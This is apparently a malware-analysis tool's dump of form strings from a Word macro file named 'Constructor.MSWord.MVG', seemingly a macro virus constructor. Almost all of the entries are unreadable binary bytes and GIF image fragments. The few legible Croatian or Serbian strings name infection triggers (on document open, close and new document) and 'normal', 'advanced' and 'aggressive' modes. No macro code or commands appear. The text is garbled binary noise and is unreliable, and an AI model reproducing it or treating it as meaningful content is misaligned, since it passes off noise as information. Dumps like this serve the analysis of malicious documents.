VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@
��T�W
��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PÛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�p or
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��GY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M2gy�ԛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p���w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	{&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@	v 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݠ��eo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pW�v	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9un,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q	� vi0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�)$f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�� I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ��p
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������J�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	�@	ŀ	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �߈[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�
zx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p
�Pw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��PS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�q��鹰E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۸�ۺ�ۼ�۾���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...na otvaranje dokumenta.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...na zatvaranje dokumenta.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...na otvaranje novog dokumenta.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Normalna
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Napredna
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Agresivnav�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��!/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙f̙3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��̙����f��3�f̙f��ff�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3��3f�33�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3ff�fffff3f3ff33f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"���������wwwUUUDDD"""
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������̙��f�����������f��3�f��f��f��ff�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3��3��3��3f�33�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������̙��f̙�̙�̙��f��f��f��3��3��3��3f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����̙����f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����̙̙��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f��3��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��f��f��f�ff�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��f��f̙f�ff�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��f��f��f�ff�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ff�ff�ff
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f3�f3�f3�f3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3��3��3��3�f3�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��3��3̙3�f3�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��3��3��3�f3�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3f�3f�3f�3ff3f33f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
33�33�33�33f33
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

2&�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��ɓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\����B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V���@�˖
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��aĈG7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ep@@K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0qJ͠�BL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1D��ʵ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�qQ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iզU�7;�(���	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2XE V�̿
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��)�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]���`AC'tQ�`�bn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
Ҧ]���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5Z�Hawg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�AE�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,Pp��Bu�x�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�j��-Rh��B/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b��&T�hQC�ζT���։�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��akjXa"u
�v���:\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0a����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͸��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}m��Ge"��]o(�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g^`�a6�i�]��|��T�
%���

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tp�b��7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5W�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p���g�@E4! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;vB�U7�UB
5�i�
��g�i"�V�^1e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XU�U��
�q�]g�YP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�é f�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�£�F�("Hj�84h��8�F
BXj	@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�:�X-mz飜"��q%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]+���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�`�e���Y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�0�f���k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j ���� �+�j-�P�	7}�G~�"p¹.��@��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z���c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���jS8^G�}8���j�	Xވ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1I��6���jtxSq���V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`|?���Z}	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I2���_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W&�|�Y`K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
TV�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,���M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�_�9�rak٤�t9�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�u�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g��z|2W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t׻u���g	#G{��U�.N��ǒbma�[j3:G�LN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/i09/o'
